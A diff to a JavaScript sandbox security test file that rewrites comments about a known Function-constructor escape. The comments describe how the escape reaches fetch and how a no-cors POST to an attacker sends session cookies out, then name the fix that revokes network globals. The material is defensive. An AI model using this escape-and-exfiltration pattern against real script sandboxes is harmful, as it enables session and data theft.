@@ -501,60 +501,77 @@ describe('Script Sandbox Security', () => {
 
   describe('nested Function constructor limitation', () => {
     it('should compile scripts that attempt Function constructor without crashing', () => {
-      // KNOWN LIMITATION: The Function constructor creates functions in the
-      // global scope, bypassing our parameter-shadowing sandbox. The actual
-      // security boundary is the Web Worker isolation (no DOM access) plus
-      // the command whitelist in the message handler. This test only verifies
-      // that scripts using the Function constructor compile and run without
-      // throwing at the sandbox level.
+      // The Function constructor creates functions in the global scope,
+      // bypassing our parameter-shadowing sandbox. Do NOT assume CSP saves us:
+      // the editor's CSP permits unsafe-eval (the script compiler itself uses
+      // the Function constructor), so eval/Function are live in the editor
+      // worker. The capability boundary is instead: (a) Web Worker isolation
+      // (no DOM), (b) the command whitelist in the message handler, and
+      // crucially (c) revokeNetworkGlobals() at worker init, which deletes
+      // fetch/XHR/WebSocket/storage from the worker global so an escaped script
+      // has no network capability to abuse (#8607). This test only verifies that
+      // such scripts compile and run without throwing at the sandbox level.
       const result = compileSandboxed(`
         function onStart() {
           try {
-            // Script authors might try this; CSP may block it in production
+            // Authors may reach eval; it is NOT blocked in the editor worker
+            // (unsafe-eval is permitted). It simply has no network/storage
+            // capability left to abuse after revokeNetworkGlobals().
             (0, eval)('1 + 1');
           } catch (_e) {
-            // Expected: CSP blocks eval in production environments
+            // Only thrown if a stricter host CSP forbids eval (e.g. the exported
+            // /play/ bundle); the editor worker permits it.
           }
         }
       `);
       expect(result.onStart).toBeTypeOf('function');
     });
 
-    it('documents the constructor.constructor escape vector is mitigated by shadowing Function', () => {
-      // KNOWN LIMITATION DOCUMENTATION:
+    it('the constructor.constructor escape is live, but its network capability is revoked at worker init', () => {
       // The pattern (0).constructor.constructor('return fetch')() reaches the
       // real Function constructor via the prototype chain even when the Function
       // parameter is shadowed, because .constructor on a number yields the
       // built-in Number constructor, and .constructor on that yields Function.
       //
-      // Mitigations in place:
-      // 1. Function is shadowed — direct Function(...) calls fail.
-      // 2. eval is shadowed — eval(...) calls fail.
-      // 3. Reflect is shadowed — Reflect.construct(Function, [...]) fails.
-      // 4. Web Worker boundary — even if a script escapes the parameter sandbox,
-      //    it runs in a Worker with no DOM, no window, no localStorage.
-      // 5. Command whitelist — only safe engine commands can be dispatched.
+      // What shadowing does and does NOT do:
+      // - Shadowing Function/eval/Reflect blocks only the naive *direct-name*
+      //   cases (Function(...), eval(...), Reflect.construct(Function, ...)).
+      // - It does NOT block the constructor-chain escape above — that bypasses
+      //   the parameter shadow entirely and is impossible to stop in pure JS
+      //   (we cannot shadow Function for real; the compiler needs it).
       //
-      // Residual risk: a script could reach the real fetch via
-      //   (0).constructor.constructor('return fetch')()(url)
-      // but the Worker has no useful origin — exfiltration is limited to
-      // cross-origin requests blocked by CORS on the target server.
+      // Why this used to be exploitable (#8607): the script worker is SAME-ORIGIN
+      // to the editor, so an escaped `fetch` carries the author's session cookies,
+      // and a `fetch(attacker, {mode:'no-cors', method:'POST', body})` exfiltrates
+      // cross-origin regardless of CORS (no response read is needed). The earlier
+      // comment here claimed "the Worker has no useful origin — limited to
+      // cross-origin requests blocked by CORS"; that was false on both counts.
       //
-      // This test verifies compilation succeeds (we cannot prevent the
-      // prototype chain attack in pure JS without a proper realm sandbox).
+      // The actual mitigation is capability removal, not name hiding:
+      // revokeNetworkGlobals() runs at worker module init and deletes
+      // fetch/XHR/WebSocket/EventSource/BroadcastChannel/indexedDB/caches from the
+      // worker global, so the escaped `Function('return fetch')()` resolves to
+      // undefined. That is proven directly in revokeNetworkGlobals.test.ts. A
+      // fuller boundary (sandboxed origin with connect-src 'none', or an AST
+      // interpreter instead of Function()) is tracked as follow-up work in #8700.
+      //
+      // This test runs in the node test realm where revokeNetworkGlobals() is not
+      // applied, so it only asserts the escape compiles/runs without throwing —
+      // the capability-revocation proof lives in revokeNetworkGlobals.test.ts.
       const result = compileSandboxed(`
         function onStart() {
           try {
-            // Attempt prototype-chain escape
+            // Prototype-chain escape — live in the editor (unsafe-eval permitted).
             const escapedFn = (0).constructor.constructor('return 42');
             void escapedFn();
           } catch (_e) {
-            // May be blocked by CSP in production
+            // Only thrown under a stricter host CSP (e.g. the exported /play/ bundle).
           }
         }
       `);
       expect(result.onStart).toBeTypeOf('function');
-      // Compilation and execution must not throw — the risk is documented above
+      // Compilation and execution must not throw — the escape is real; the network
+      // capability it would reach is revoked at worker init (see #8607).
       expect(() => result.onStart()).not.toThrow();
     });
   });
